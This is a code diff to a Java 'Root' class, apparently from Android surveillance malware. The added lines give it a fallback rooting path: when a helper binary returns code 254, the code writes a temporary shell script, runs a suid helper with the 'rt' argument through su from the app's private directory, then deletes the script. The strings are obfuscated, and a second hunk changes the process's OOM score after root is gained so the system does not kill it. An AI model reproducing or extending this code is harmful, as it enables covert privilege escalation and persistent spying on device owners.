@@ -297,6 +297,24 @@ public class Root {
 				Check.log(TAG + " (supersuRoot) execute 2: " + suidext + " ret: " + res.exitCode);
 			}
 
+			if(res.exitCode == 254){
+
+				String script = M.e("#!/system/bin/sh") + "\n"
+						+ String.format(M.e("%s rt"), suidext.getFilename()) + "\n";
+
+				ExecuteResult result = new ExecuteResult(SU);
+
+				if (Root.createScript("e", script) == true) {
+					boolean r = Execute.executeWaitFor(String.format(M.e("%s -c /data/data/%s/files/e"),
+							SU, pack));
+
+					Root.removeScript("e");
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (supersuRoot) execute 3: " + suidext + " ret: " + r);
+					}
+				}
+			}
+
 			suidext.delete();
 
 		} catch (final Exception e1) {
@@ -760,12 +778,13 @@ public class Root {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(getPermissions): Wow! Such power, many rights, very good, so root!");
 				}
+				// Avoid having the process killed for using too many resources
+				Root.adjustOom();
 			} else {
 				Configuration.shellFile = Configuration.shellFileBase;
 			}
 
-			// Avoid having the process killed for using too many resources
-			Root.adjustOom();
+
 		} finally {
 			semGetPermission.release();
 		}
